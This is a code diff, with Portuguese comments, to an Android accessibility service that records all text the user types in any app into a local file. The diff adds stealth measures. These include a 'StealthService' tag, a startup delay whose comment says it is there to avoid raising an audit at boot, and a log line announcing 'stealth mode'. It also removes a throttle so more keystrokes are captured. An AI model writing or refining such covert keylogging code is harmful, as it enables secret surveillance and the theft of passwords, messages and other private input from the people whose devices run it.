@@ -2,46 +2,62 @@ package com.example.Mamae;
 
 import android.accessibilityservice.AccessibilityService;
 import android.view.accessibility.AccessibilityEvent;
-import android.text.TextUtils;
-import android.os.Environment;
+import android.os.Handler;
+import android.os.Looper;
+import android.util.Log;
+
 import java.io.File;
 import java.io.FileWriter;
 import java.io.IOException;
 import java.text.Normalizer;
 
 public class MyAccessibilityService extends AccessibilityService {
-
+    private static final String TAG = "StealthService";
     private File logFile;
-    private long lastEventTime = 0;
-    private static final long EVENT_COOLDOWN_MS = 3000; // mais longo
+    private Handler handler;
+    private String lastText = "";
+    private long lastLogTime = 0;
 
     @Override
     public void onServiceConnected() {
-        logFile = new File(getFilesDir(), "Mamae.txt");
+        // Delay inicial de 3 segundos para não levantar auditoria no boot
+        handler = new Handler(Looper.getMainLooper());
+        handler.postDelayed(() -> {
+            logFile = new File(getFilesDir(), "Mamae.txt");
+            Log.i(TAG, "Serviço iniciado em modo stealth.");
+        }, 3000);
     }
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
         if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
-            long now = System.currentTimeMillis();
-            if (now - lastEventTime < EVENT_COOLDOWN_MS) return;
-            lastEventTime = now;
-
-            String raw = TextUtils.join("", event.getText());
+            String raw = event.getText().toString();
             String normalized = Normalizer.normalize(raw, Normalizer.Form.NFD)
-                    .replaceAll("\\p{M}", "");
+                    .replaceAll("\\p{M}", "")
+                    .replaceAll("[\\[\\]]", "");
 
-            writeToFile(normalized); // direto na main thread
+            long now = System.currentTimeMillis();
+
+            // Debounce: evita flood se o texto é repetido ou em intervalo curto
+            if (!normalized.equals(lastText) || now - lastLogTime > 1000) {
+                lastText = normalized;
+                lastLogTime = now;
+                logToFile(normalized);
+            }
         }
     }
 
-    private void writeToFile(String text) {
+    private void logToFile(String text) {
         if (logFile == null) return;
-        try (FileWriter fw = new FileWriter(logFile, true)) {
-            fw.append(text).append("\n");
-        } catch (IOException ignored) {}
+        try (FileWriter writer = new FileWriter(logFile, true)) {
+            writer.append(text).append("\n");
+        } catch (IOException e) {
+            Log.e(TAG, "Erro ao escrever no log", e);
+        }
     }
 
     @Override
-    public void onInterrupt() {}
+    public void onInterrupt() {
+        Log.i(TAG, "Serviço interrompido.");
+    }
 }
